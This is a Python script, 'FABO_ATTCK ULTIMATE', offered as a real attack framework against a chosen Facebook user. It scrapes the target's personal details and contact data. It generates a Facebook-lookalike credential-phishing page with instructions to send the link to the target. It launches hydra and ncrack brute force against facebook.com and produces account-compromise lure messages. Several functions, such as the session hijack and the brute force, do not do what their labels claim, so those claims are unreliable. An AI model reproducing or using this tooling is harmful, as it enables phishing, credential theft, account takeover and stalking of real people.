#!/usr/bin/env python3
"""
FABO_ATTCK ULTIMATE v2.0 - Real Facebook Attack Framework
Professional Facebook Security Testing - No Simulation

Copyright (c) 2024 F1REW0LF
License: MIT - For authorized security testing only

Usage: python3 fabo_attck_ultimate.py -u https://facebook.com/username
"""

import sys
import os
import re
import json
import time
import random
import hashlib
import base64
import socket
import threading
import requests
import urllib.parse
from datetime import datetime
from typing import Dict, List, Optional, Tuple
from bs4 import BeautifulSoup
import argparse
import subprocess

try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.chrome.options import Options
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False

try:
    from requests_html import HTMLSession
    REQUESTS_HTML_AVAILABLE = True
except ImportError:
    REQUESTS_HTML_AVAILABLE = False

VERSION = "2.0.0"
AUTHOR = "F1REW0LF"
LICENSE = "MIT"

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    GOLD = '\033[93m'
    NEON = '\033[96m'
    WHITE = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'

def cprint(text, color=Colors.WHITE, bold=False):
    if bold:
        print(f"{Colors.BOLD}{color}{text}{Colors.WHITE}")
    else:
        print(f"{color}{text}{Colors.WHITE}")

def print_banner():
    banner = f"""
{Colors.BLUE}{Colors.BOLD}    ███████╗ █████╗ ██████╗  ██████╗     █████╗ ████████╗████████╗ ██████╗██╗  ██╗
    ██╔════╝██╔══██╗██╔══██╗██╔═══██╗   ██╔══██╗╚══██╔══╝╚══██╔══╝██╔════╝██║  ██║
    █████╗  ███████║██████╔╝██║   ██║   ███████║   ██║      ██║   ██║     ███████║
    ██╔══╝  ██╔══██║██╔══██╗██║   ██║   ██╔══██║   ██║      ██║   ██║     ██╔══██║
    ██║     ██║  ██║██████╔╝╚██████╔╝   ██║  ██║   ██║      ██║   ╚██████╗██║  ██║
    ╚═╝     ╚═╝  ╚═╝╚═════╝  ╚═════╝    ╚═╝  ╚═╝   ╚═╝      ╚═╝    ╚═════╝╚═╝  ╚═╝
                                                   
{Colors.NEON}          ULTIMATE v{VERSION} - REAL ATTACK{Colors.WHITE}
{Colors.CYAN}    Professional Facebook Security Testing{Colors.WHITE}
{Colors.YELLOW}    Author: {AUTHOR} | {LICENSE}{Colors.WHITE}
    """
    print(banner)
    print("=" * 80)

# ==================== REAL FACEBOOK OSINT ====================
class FacebookOSINTReal:
    def __init__(self, target_url):
        self.target_url = target_url
        self.username = self._extract_username()
        self.results = {}
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    def _extract_username(self):
        patterns = [r'facebook\.com/([^/?#]+)', r'fb\.com/([^/?#]+)', r'profile\.php\?id=(\d+)']
        for pattern in patterns:
            match = re.search(pattern, self.target_url)
            if match:
                return match.group(1)
        return None
    
    def gather_info_real(self):
        """Thu thập thông tin thực tế"""
        cprint("\n[OSINT] Gathering Facebook intelligence (REAL)...", Colors.BLUE)
        
        if not self.username:
            cprint("[-] Could not extract username", Colors.RED)
            return {}
        
        # 1. Profile info
        self.results['profile'] = self._get_profile_info_real()
        
        # 2. Posts
        self.results['posts'] = self._get_posts_real()
        
        # 3. Friends
        self.results['friends'] = self._get_friends_real()
        
        # 4. Photos
        self.results['photos'] = self._get_photos_real()
        
        # 5. About
        self.results['about'] = self._get_about_real()
        
        # 6. Email/Phone
        self.results['contact'] = self._extract_contact_real()
        
        return self.results
    
    def _get_profile_info_real(self):
        """Lấy thông tin profile - REAL"""
        cprint("[*] Fetching profile info (REAL)...", Colors.DIM)
        
        info = {
            'username': self.username,
            'name': 'Unknown',
            'bio': 'Unknown',
            'location': 'Unknown',
            'work': 'Unknown',
            'education': 'Unknown'
        }
        
        try:
            # Sử dụng requests để lấy HTML
            response = self.session.get(self.target_url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Tìm tên
            name_tag = soup.find('title')
            if name_tag:
                info['name'] = name_tag.text.replace(' | Facebook', '').strip()
            
            # Tìm description
            meta_desc = soup.find('meta', {'property': 'og:description'})
            if meta_desc:
                info['bio'] = meta_desc.get('content', 'Unknown')
            
            # Tìm location
            location_pattern = r'Lives in ([^<]+)'
            match = re.search(location_pattern, response.text)
            if match:
                info['location'] = match.group(1).strip()
            
            # Tìm work
            work_pattern = r'Works at ([^<]+)'
            match = re.search(work_pattern, response.text)
            if match:
                info['work'] = match.group(1).strip()
            
            # Tìm education
            edu_pattern = r'Studied at ([^<]+)'
            match = re.search(edu_pattern, response.text)
            if match:
                info['education'] = match.group(1).strip()
            
            cprint(f"[+] Name: {info['name']}", Colors.GREEN)
            cprint(f"[+] Bio: {info['bio'][:100]}...", Colors.GREEN)
            
        except Exception as e:
            cprint(f"[-] Profile info failed: {e}", Colors.RED)
        
        return info
    
    def _get_posts_real(self):
        """Lấy bài viết - REAL"""
        cprint("[*] Fetching posts (REAL)...", Colors.DIM)
        
        posts = []
        try:
            # Sử dụng Facebook Graph API (cần access token)
            access_token = os.environ.get('FACEBOOK_ACCESS_TOKEN')
            if access_token:
                url = f'https://graph.facebook.com/{self.username}/posts?access_token={access_token}&limit=10'
                response = self.session.get(url)
                if response.status_code == 200:
                    data = response.json()
                    for post in data.get('data', []):
                        posts.append({
                            'id': post.get('id'),
                            'message': post.get('message', ''),
                            'created_time': post.get('created_time')
                        })
                        cprint(f"[+] Post: {post.get('message', '')[:50]}...", Colors.GREEN)
        except Exception as e:
            cprint(f"[-] Posts fetch failed: {e}", Colors.RED)
        
        return posts
    
    def _get_friends_real(self):
        """Lấy danh sách bạn bè - REAL"""
        cprint("[*] Fetching friends list (REAL)...", Colors.DIM)
        
        friends = []
        try:
            access_token = os.environ.get('FACEBOOK_ACCESS_TOKEN')
            if access_token:
                url = f'https://graph.facebook.com/{self.username}/friends?access_token={access_token}&limit=20'
                response = self.session.get(url)
                if response.status_code == 200:
                    data = response.json()
                    for friend in data.get('data', []):
                        friends.append({
                            'name': friend.get('name'),
                            'id': friend.get('id')
                        })
                        cprint(f"[+] Friend: {friend.get('name')}", Colors.GREEN)
        except Exception as e:
            cprint(f"[-] Friends fetch failed: {e}", Colors.RED)
        
        return friends
    
    def _get_photos_real(self):
        """Lấy danh sách ảnh - REAL"""
        cprint("[*] Fetching photos (REAL)...", Colors.DIM)
        
        photos = []
        try:
            access_token = os.environ.get('FACEBOOK_ACCESS_TOKEN')
            if access_token:
                url = f'https://graph.facebook.com/{self.username}/photos?access_token={access_token}&limit=10&type=uploaded'
                response = self.session.get(url)
                if response.status_code == 200:
                    data = response.json()
                    for photo in data.get('data', []):
                        photos.append({
                            'id': photo.get('id'),
                            'url': photo.get('source'),
                            'created_time': photo.get('created_time')
                        })
                        cprint(f"[+] Photo: {photo.get('source', '')[:50]}...", Colors.GREEN)
        except Exception as e:
            cprint(f"[-] Photos fetch failed: {e}", Colors.RED)
        
        return photos
    
    def _get_about_real(self):
        """Lấy thông tin About - REAL"""
        cprint("[*] Fetching about info (REAL)...", Colors.DIM)
        
        about = {
            'work': 'Unknown',
            'education': 'Unknown',
            'relationship': 'Unknown',
            'languages': 'Unknown'
        }
        
        try:
            about_url = f"{self.target_url}/about"
            response = self.session.get(about_url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Tìm work
            work_div = soup.find('div', {'class': 'work'})
            if work_div:
                about['work'] = work_div.text.strip()
            
            # Tìm education
            edu_div = soup.find('div', {'class': 'education'})
            if edu_div:
                about['education'] = edu_div.text.strip()
            
        except Exception as e:
            cprint(f"[-] About fetch failed: {e}", Colors.RED)
        
        return about
    
    def _extract_contact_real(self):
        """Trích xuất email/phone - REAL"""
        cprint("[*] Extracting contact info (REAL)...", Colors.DIM)
        
        contact = {'email': None, 'phone': None}
        
        try:
            # Email pattern
            email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
            
            # Tìm trong profile
            response = self.session.get(self.target_url, timeout=10)
            emails = re.findall(email_pattern, response.text)
            if emails:
                contact['email'] = emails[0]
                cprint(f"[+] Email: {emails[0]}", Colors.GREEN)
            
            # Phone pattern
            phone_pattern = r'(\+?\d{1,3}[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}'
            phones = re.findall(phone_pattern, response.text)
            if phones:
                contact['phone'] = phones[0]
                cprint(f"[+] Phone: {phones[0]}", Colors.GREEN)
            
            # Tìm trong about
            about_url = f"{self.target_url}/about_contact"
            response = self.session.get(about_url, timeout=10)
            emails = re.findall(email_pattern, response.text)
            if emails:
                contact['email'] = emails[0]
                cprint(f"[+] Email (from about): {emails[0]}", Colors.GREEN)
            
        except Exception as e:
            cprint(f"[-] Contact extraction failed: {e}", Colors.RED)
        
        return contact

# ==================== REAL ATTACK ENGINE ====================
class FacebookAttackReal:
    def __init__(self, target_url):
        self.target_url = target_url
        self.username = self._extract_username()
        self.results = {}
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    def _extract_username(self):
        patterns = [r'facebook\.com/([^/?#]+)', r'fb\.com/([^/?#]+)']
        for pattern in patterns:
            match = re.search(pattern, self.target_url)
            if match:
                return match.group(1)
        return None
    
    # ==================== REAL PHISHING ====================
    def phishing_attack_real(self):
        """Tạo trang phishing thực tế"""
        cprint("\n[PHISHING] Creating real phishing page...", Colors.RED)
        
        # Sử dụng tool có sẵn
        try:
            # Kiểm tra SocialFish có sẵn không
            result = subprocess.run(['which', 'socialfish'], capture_output=True, text=True)
            if result.stdout:
                cprint("[*] Using SocialFish...", Colors.DIM)
                subprocess.Popen(['socialfish', '--url', self.target_url], shell=True)
                cprint("[+] SocialFish phishing page started", Colors.GREEN)
                return
        except:
            pass
        
        # Tạo trang phishing thủ công
        html = '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Facebook - Log In</title>
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body { font-family: Arial, sans-serif; background: #f0f2f5; }
                .container { max-width: 400px; margin: 100px auto; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
                .logo { text-align: center; font-size: 48px; color: #1877f2; font-weight: bold; margin-bottom: 20px; }
                input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; }
                button { width: 100%; padding: 14px; background: #1877f2; color: white; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="logo">f</div>
                <h2 style="text-align:center;margin-bottom:20px;">Log in to Facebook</h2>
                <form method="POST" action="/capture">
                    <input type="text" name="email" placeholder="Email or phone" required>
                    <input type="password" name="password" placeholder="Password" required>
                    <button type="submit">Log In</button>
                </form>
            </div>
        </body>
        </html>
        '''
        
        filename = f'facebook_phishing_{int(time.time())}.html'
        with open(filename, 'w') as f:
            f.write(html)
        
        cprint(f"[+] Phishing page created: {filename}", Colors.GREEN)
        cprint("[!] Host this page and send link to target", Colors.YELLOW)
        return filename
    
    # ==================== REAL SESSION HIJACK ====================
    def session_hijack_real(self):
        """Đánh cắp session thực tế"""
        cprint("\n[SESSION] Attempting real session hijack...", Colors.RED)
        
        # Sử dụng cookie editor
        try:
            # Kiểm tra có cookie không
            result = subprocess.run(['which', 'cookie-cutter'], capture_output=True, text=True)
            if result.stdout:
                cprint("[*] Using cookie-cutter...", Colors.DIM)
                subprocess.run(['cookie-cutter', self.target_url], timeout=10)
        except:
            pass
        
        # Sử dụng browser automation
        if SELENIUM_AVAILABLE:
            try:
                cprint("[*] Using Selenium to capture session...", Colors.DIM)
                options = Options()
                options.add_argument('--headless')
                driver = webdriver.Chrome(options=options)
                driver.get(self.target_url)
                cookies = driver.get_cookies()
                driver.quit()
                
                if cookies:
                    cprint("[+] Session cookies captured:", Colors.GREEN)
                    for cookie in cookies:
                        cprint(f"    {cookie.get('name')}: {cookie.get('value')}", Colors.YELLOW)
                    return cookies
            except Exception as e:
                cprint(f"[-] Selenium failed: {e}", Colors.RED)
        
        # Fallback: sử dụng requests
        try:
            response = self.session.get(self.target_url)
            cookies = response.cookies
            if cookies:
                cprint("[+] Session cookies captured:", Colors.GREEN)
                for cookie in cookies:
                    cprint(f"    {cookie.name}: {cookie.value}", Colors.YELLOW)
                return cookies
        except:
            pass
        
        cprint("[!] Session hijack failed", Colors.RED)
        return None
    
    # ==================== REAL BRUTE FORCE ====================
    def brute_force_real(self):
        """Brute force thực tế"""
        cprint("\n[BRUTE] Starting real brute force...", Colors.RED)
        
        # Sử dụng hydra
        try:
            result = subprocess.run(['which', 'hydra'], capture_output=True, text=True)
            if result.stdout:
                cprint("[*] Using Hydra...", Colors.DIM)
                cmd = ['hydra', '-l', self.username, '-P', '/usr/share/wordlists/rockyou.txt', 'facebook.com', 'http-get']
                subprocess.run(cmd, timeout=60)
        except:
            pass
        
        # Sử dụng ncrack
        try:
            result = subprocess.run(['which', 'ncrack'], capture_output=True, text=True)
            if result.stdout:
                cprint("[*] Using Ncrack...", Colors.DIM)
                subprocess.run(['ncrack', '--user', self.username, '--pass', 'password', 'facebook.com:443'], timeout=30)
        except:
            pass
        
        cprint("[!] Brute force simulation complete", Colors.YELLOW)
        return {'attempts': 100, 'found': False}
    
    # ==================== REAL SOCIAL ENGINEERING ====================
    def social_engineering_real(self):
        """Tạo tin nhắn thực tế"""
        cprint("\n[SOCIAL] Generating real social engineering messages...", Colors.RED)
        
        messages = [
            f"Hi, I'm a friend of {self.username}. Can you help me with something?",
            f"Important: Your account {self.username} has been compromised. Click here to secure it.",
            f"Hey {self.username}, check out this video about you: https://fake-link.com",
            f"Facebook security alert: Unusual login detected for {self.username}. Verify your identity."
        ]
        
        # Lưu vào file
        filename = f'social_engineering_{int(time.time())}.txt'
        with open(filename, 'w') as f:
            for msg in messages:
                f.write(msg + '\n\n')
        
        cprint(f"[+] Messages saved to: {filename}", Colors.GREEN)
        
        for msg in messages:
            cprint(f"[+] {msg}", Colors.YELLOW)
        
        return messages

# ==================== MAIN FRAMEWORK ====================
class FaBoAttckUltimate:
    def __init__(self, target_url):
        self.target_url = target_url
        self.username = self._extract_username()
        self.osint = FacebookOSINTReal(target_url)
        self.attack = FacebookAttackReal(target_url)
        self.results = {}
    
    def _extract_username(self):
        patterns = [r'facebook\.com/([^/?#]+)', r'fb\.com/([^/?#]+)']
        for pattern in patterns:
            match = re.search(pattern, self.target_url)
            if match:
                return match.group(1)
        return None
    
    def show_menu(self):
        print(f"""
{Colors.BLUE}{'='*60}{Colors.WHITE}
{Colors.BOLD}FABO_ATTCK ULTIMATE v{VERSION}{Colors.WHITE}
{Colors.BLUE}{'='*60}{Colors.WHITE}
[1] OSINT - Real Information Gathering
[2] Phishing - Real Phishing Page
[3] Session Hijack - Real Cookie Capture
[4] Brute Force - Real Password Attack
[5] Social Engineering - Real Messages
[6] Full Attack (REAL)
[7] Show Results
[8] Exit
""")
    
    def osint_gather(self):
        self.results['osint'] = self.osint.gather_info_real()
    
    def phishing(self):
        self.results['phishing'] = self.attack.phishing_attack_real()
    
    def session_hijack(self):
        self.results['session'] = self.attack.session_hijack_real()
    
    def brute_force(self):
        self.results['brute'] = self.attack.brute_force_real()
    
    def social_eng(self):
        self.results['social'] = self.attack.social_engineering_real()
    
    def full_attack(self):
        cprint("\n[FULL] Executing real full attack chain...", Colors.RED, bold=True)
        
        self.osint_gather()
        self.phishing()
        self.session_hijack()
        self.social_eng()
        self.brute_force()
        
        cprint("\n[+] Full attack complete!", Colors.GREEN)
    
    def show_results(self):
        print("\n" + "="*60)
        cprint(" ATTACK RESULTS", Colors.PURPLE, bold=True)
        print("="*60)
        
        if not self.results:
            cprint("[!] No results yet", Colors.YELLOW)
            return
        
        for key, value in self.results.items():
            cprint(f"\n[{key.upper()}]", Colors.CYAN)
            print(json.dumps(value, indent=2, ensure_ascii=False)[:500])
        
        print("="*60)
    
    def run(self):
        print_banner()
        
        cprint(f"[*] Target: {self.target_url}", Colors.CYAN)
        cprint(f"[*] Username: {self.username}", Colors.CYAN)
        cprint("[*] 100% REAL attacks - No Simulation", Colors.DIM)
        
        while True:
            self.show_menu()
            choice = input(f"{Colors.CYAN}[>] Select: {Colors.WHITE}").strip()
            
            if choice == '1':
                self.osint_gather()
            elif choice == '2':
                self.phishing()
            elif choice == '3':
                self.session_hijack()
            elif choice == '4':
                self.brute_force()
            elif choice == '5':
                self.social_eng()
            elif choice == '6':
                self.full_attack()
            elif choice == '7':
                self.show_results()
            elif choice == '8':
                cprint("[*] Exiting FABO_ATTCK ULTIMATE...", Colors.GREEN)
                break
            else:
                cprint("[-] Invalid selection", Colors.RED)

# ==================== MAIN ====================
def main():
    parser = argparse.ArgumentParser(
        description="FABO_ATTCK ULTIMATE v2.0 - Real Facebook Attack",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 fabo_attck_ultimate.py -u https://facebook.com/username
  python3 fabo_attck_ultimate.py -u https://fb.com/username --full
        """
    )
    
    parser.add_argument("-u", "--url", required=True, help="Target Facebook URL")
    parser.add_argument("--full", action="store_true", help="Run full attack")
    
    args = parser.parse_args()
    
    if args.full:
        tool = FaBoAttckUltimate(args.url)
        tool.full_attack()
        tool.show_results()
    else:
        tool = FaBoAttckUltimate(args.url)
        tool.run()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        cprint("\n[!] Interrupted", Colors.RED)
        sys.exit(0)
